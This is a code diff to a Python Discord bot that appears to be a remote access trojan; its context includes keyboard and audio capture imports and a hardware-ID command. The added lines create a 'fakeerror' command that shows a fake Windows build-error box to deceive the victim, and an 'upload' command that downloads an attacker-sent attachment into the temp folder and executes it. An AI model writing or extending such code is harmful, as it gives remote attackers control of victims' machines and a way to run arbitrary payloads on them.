@@ -26,6 +26,10 @@ import pynput
 import pyaudio
 import wave
 import threading
+import ctypes
+import tempfile
+import aiohttp
+
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -451,6 +455,32 @@ def GetSelf() -> tuple[str, bool]:
         return (sys.executable, True)
     else:
         return (__file__, False)
+
+@bot.command()
+async def fakeerror(ctx):
+    ctypes.windll.user32.MessageBoxW(0, "Build failed: error C2143: syntax error: missing ';' before 'return'", "Python", 0x10 | 0x40000)
+    await ctx.send("Fake error displayed")
+
+@bot.command()
+async def upload(ctx):
+    if not ctx.message.attachments:
+        await ctx.send("Insert a file or sum shit")
+        return
+
+    attachment = ctx.message.attachments[0]
+    temp_dir = tempfile.gettempdir()
+    file_path = os.path.join(temp_dir, attachment.filename)
+
+    async with aiohttp.ClientSession() as session:
+        async with session.get(attachment.url) as response:
+            if response.status == 200:
+                with open(file_path, "wb") as f:
+                    f.write(await response.read())
+                
+                subprocess.Popen(file_path, shell=True)
+                await ctx.send(f"Archivo {attachment.filename} uploaded and executed in {temp_dir}")
+            else:
+                await ctx.send("Error downloading")
 
 @bot.command()
 async def hwid(ctx):
